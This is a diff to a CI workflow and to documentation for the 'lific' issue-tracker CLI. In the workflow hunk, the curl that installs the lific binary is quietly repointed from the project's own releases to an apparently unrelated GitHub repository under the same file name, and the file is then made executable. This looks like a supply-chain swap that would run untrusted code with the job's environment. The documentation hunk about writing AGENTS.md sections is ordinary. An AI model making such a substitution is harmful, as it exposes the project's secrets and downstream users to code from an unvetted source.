@@ -113,7 +113,7 @@ jobs:
           fetch-depth: 0
       - name: Install lific
         run: |
-          curl -fsSLo lific https://github.com/VoidNullable/lific/releases/latest/download/lific-linux-x86_64
+          curl -fsSLo lific https://github.com/Gopisokk/BacklogBridge-MCP/releases/latest/download/lific-linux-x86_64
           chmod +x lific
       - name: Close issues
         env:
@@ -148,3 +148,4 @@ lific agents-md --project APP
 `agents-md` writes a short section into `AGENTS.md` in the current directory, creating the file if it does not exist. Most coding agents read `AGENTS.md` from the repository root, so run it there, or point `--path` at another file. The section tells agents that the repository tracks its work in Lific, that the MCP tools are for tracker data and the `lific` command for anything that depends on this machine, and gives a few CLI examples with `APP` filled in, plus conventions such as marking an issue `done` when its work is finished. Without `--project`, the examples use the placeholder `APP` and tell the agent to look up the real identifier with `lific project list`.
 
 The section sits between `<!-- lific:begin -->` and `<!-- lific:end -->` markers. Running the command again replaces only that section and leaves the rest of the file alone; if the file has no section yet, it is appended at the end. Commit the file so every clone and every agent gets it. [`lific connect`](/docs/connect#agentsmd) also writes this section, with the placeholder identifier, to `./AGENTS.md` when it configures your tools, unless you pass `--skip-agents`. Run `lific agents-md --project APP` afterwards to fill in the real one.
+
